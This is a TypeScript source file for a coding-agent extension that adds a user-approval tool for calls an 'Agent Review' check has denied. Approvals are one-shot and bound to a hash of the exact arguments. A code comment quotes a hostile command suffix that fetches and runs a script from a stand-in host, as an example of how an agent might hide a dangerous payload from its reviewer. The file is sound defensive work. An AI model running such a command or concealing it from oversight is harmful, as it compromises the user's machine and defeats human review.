import {randomUUID} from 'node:crypto';
import type {ExtensionAPI} from '@earendil-works/pi-coding-agent';
import {stringify} from 'safe-stable-stringify';
import {Type} from 'typebox';
import {
	approvalEntryType,
	approvalTtlMs,
	computeArgsHash,
	type ApprovalLedger,
} from './approval-ledger.ts';

export const approvalToolName = 'request_user_approval';

export function registerApprovalTool(pi: ExtensionAPI, ledger: ApprovalLedger): void {
	pi.registerTool({
		name: approvalToolName,
		label: 'Request user approval',
		description: 'Ask the user to confirm a tool call that Agent Review denied. Pass the exact tool name and input you intend to run, unchanged. If the user approves, retry the identical tool call.',
		promptSnippet: 'request_user_approval: ask the user to confirm a tool call that Agent Review denied',
		promptGuidelines: [
			'When Agent Review denies a tool call the user appears to want, call request_user_approval with the exact tool name and input you intended to run, then retry the identical call after the user approves.',
			'Approvals are one-shot and match only the exact same tool name and input; do not alter the call between approval and retry.',
		],
		parameters: Type.Object({
			toolName: Type.String({description: 'The exact tool name you intend to run.'}),
			input: Type.Unknown({description: 'The exact input object for the tool call, unchanged.'}),
			reason: Type.String({description: 'One sentence explaining why this action is needed.'}),
		}),
		async execute(_toolCallId, params, _signal, _onUpdate, context) {
			if (!context.hasUI) {
				return {
					content: [{type: 'text', text: 'No interactive UI is available, so user approval cannot be requested. Stop and ask the user directly.'}],
					details: undefined,
				};
			}

			// Show the FULL input the approval will authorize. Truncating here would
			// let the agent hide a dangerous suffix (e.g. `; curl evil.com | sh`)
			// past the display limit while the hash still covers the whole payload.
			const serializedInput = stringify(params.input) ?? 'null';
			const isApproved = await context.ui.confirm(
				`Agent Review: approve ${params.toolName}?`,
				`${params.reason}\n\nTool: ${params.toolName}\nCwd: ${context.cwd}\nArgs: ${serializedInput}`,
			);

			if (!isApproved) {
				return {
					content: [{type: 'text', text: `User declined ${params.toolName}. Do not retry it or pursue the same outcome another way; continue with a safer alternative or stop.`}],
					details: undefined,
				};
			}

			const approval = {
				argsHash: computeArgsHash(params.toolName, params.input, context.cwd),
				nonce: randomUUID(),
				expiresAt: Date.now() + approvalTtlMs,
			};
			ledger.record(approval);
			pi.appendEntry(approvalEntryType, approval);
			return {
				content: [{type: 'text', text: `User approved ${params.toolName}. Retry the identical tool call now; this approval authorizes exactly one execution of that call and expires shortly.`}],
				details: undefined,
			};
		},
	});
}
